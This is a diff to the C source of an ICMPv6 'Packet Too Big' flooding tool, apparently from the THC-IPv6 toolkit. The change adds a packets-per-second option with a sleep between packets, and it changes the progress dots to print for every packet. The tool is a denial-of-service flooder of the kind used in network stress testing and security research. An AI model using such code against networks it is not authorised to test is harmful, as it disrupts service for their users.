@@ -24,6 +24,7 @@ void help(char *prg) {
   printf(" -R      randomize the source fully\n");
   printf(" -m      generate a maximum size packet\n");
   printf(" -o      do not flood to network,just flood to target ip\n");
+  printf(" -n packagesNumPerSec  send packages num per second\n");
   printf(" -s sourceip6  use this as source IPv6 address\n");
   printf("\nFlood the target /64 network with ICMPv6 TooBig error messages.\n");
   printf("This tool version is manyfold more effective than ndpexhaust6.\n");
@@ -39,7 +40,7 @@ int main(int argc, char *argv[]) {
   unsigned char *pkt = NULL, ip6[8];
   int pkt_len = 0, count = 0;
   thc_ipv6_hdr *hdr;
-  unsigned int filler = IDS_STRING, mychecksum;
+  unsigned int filler = IDS_STRING, mychecksum, packagesNumPerSec=100;
   unsigned char offender[1452] = { 0x60, 0x00, 0x00, 0x00, 0x01, 0xcd, 0x3a, 0x3f,
                                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
@@ -67,8 +68,8 @@ int main(int argc, char *argv[]) {
   srand(time(NULL) + getpid());
   setvbuf(stdout, NULL, _IONBF, 0);
   setvbuf(stderr, NULL, _IONBF, 0);
-  
-   while ((i = getopt(argc, argv, "acpPTUrRos:m")) >= 0) {
+
+   while ((i = getopt(argc, argv, "acpPTUrRos:mn:")) >= 0) {
      switch(i) {
        case 'a':
          alert = 8;
@@ -103,6 +104,9 @@ int main(int argc, char *argv[]) {
       case 'o':
          oneDst=1;
          break;
+      case 'n':
+         packagesNumPerSec=atoi(optarg);
+         break;
        default:
          fprintf(stderr, "Error: unknown option -%c\n", i);
          exit(-1);
@@ -125,18 +129,18 @@ int main(int argc, char *argv[]) {
     fprintf(stderr, "Error: invalid interface %s\n", interface);
     exit(-1);
   }
-  
+
   if (src == NULL)
     if ((src = thc_get_own_ipv6(interface, dst, PREFER_GLOBAL)) == NULL || (src[0] == 0xfe && src[1] == 0x80)) {
       fprintf(stderr, "Error: no global IPv6 address configured on interface %s\n", interface);
       exit(-1);
     }
-  
+
   if ((dstmac = thc_get_mac(interface, src, dst)) == NULL) {
     fprintf(stderr, "Error: can not find a route to target %s\n", argv[2]);
     exit(-1);
   }
-  
+
   if (maxsize == -1)
     maxsize = thc_get_mtu(interface) - 48 - alert;
 
@@ -161,11 +165,11 @@ int main(int argc, char *argv[]) {
   if (thc_generate_pkt(interface, srcmac, dstmac, pkt, &pkt_len) < 0)
     return -1;
   hdr = (thc_ipv6_hdr *) pkt;
-  
+
   if (do_hdr_size)
     offset = do_hdr_size;
 
-  printf("Starting to flood target network with toobig %s (Press Control-C to end, a dot is printed for every 1000 packets):\n", interface);
+  printf("Starting to flood target network with toobig %s %d packages per second (Press Control-C to end, a dot is printed for every packet):\n", interface,packagesNumPerSec);
   while (1) {
 
    if(!oneDst){
@@ -179,7 +183,7 @@ int main(int argc, char *argv[]) {
       for (i = randsrc; i < 16; i++)
         hdr->pkt[offset + 8 + i] = rand() % 256;
     }
-    
+
     if (do_crc) {
       hdr->pkt[offset + 42 + alert] = 0;
       hdr->pkt[offset + 43 + alert] = 0;
@@ -190,9 +194,10 @@ int main(int argc, char *argv[]) {
 
     while (thc_send_pkt(interface, pkt, &pkt_len) < 0)
       usleep(1);
-
+    usleep(1000000/packagesNumPerSec);
+    //printf("sleep %d us\n",1000000/packagesNumPerSec);
     count++;
-    if (count % 1000 == 0)
+    //if (count % 1000 == 0)
       printf(".");
   }
   return 0;
